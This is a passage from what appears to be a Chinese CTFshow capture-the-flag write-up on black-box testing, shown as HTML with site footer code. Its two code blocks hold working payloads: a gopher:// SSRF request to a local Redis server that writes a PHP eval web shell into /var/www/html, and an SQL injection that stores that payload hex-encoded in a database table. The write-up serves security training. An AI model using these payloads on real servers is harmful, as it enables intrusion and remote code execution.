+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2430%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B1%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure>
+
+<p>然后将其插入到link表的insert字段当中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; insert into link values(10,&quot;a&quot;, 0x676f706865723a2f2f3132372e302e302e313a363337392f5f2532413125304425304125323438253044253041666c757368616c6c2530442530412532413325304425304125323433253044253041736574253044253041253234312530442530413125304425304125323433302530442530412530412530412533432533467068702532302534306576616c2532382532345f504f5354253542312535442532392533422532302533462533452530412530412530442530412532413425304425304125323436253044253041636f6e666967253044253041253234332530442530417365742530442530412532343325304425304164697225304425304125323431332530442530412f7661722f7777772f68746d6c2530442530412532413425304425304125323436253044253041636f6e666967253044253041253234332530442530417365742530442530412532343130253044253041646266696c656e616d65253044253041253234392530442530417368656c6c2e706870253044253041253241312530442530412532343425304425304173617665253044253041253041); %23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117230226894.png" alt="image-20221117230226894"></p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117230321734.png" alt="image-20221117230321734"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&text=CTFSHOW-黑盒测试"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&title=CTFSHOW-黑盒测试"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&is_video=false&description=CTFSHOW-黑盒测试"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTFSHOW-黑盒测试&body=Check out this article: https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&title=CTFSHOW-黑盒测试"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&title=CTFSHOW-黑盒测试"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&title=CTFSHOW-黑盒测试"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&title=CTFSHOW-黑盒测试"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&name=CTFSHOW-黑盒测试&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&t=CTFSHOW-黑盒测试"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    RacerZ
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
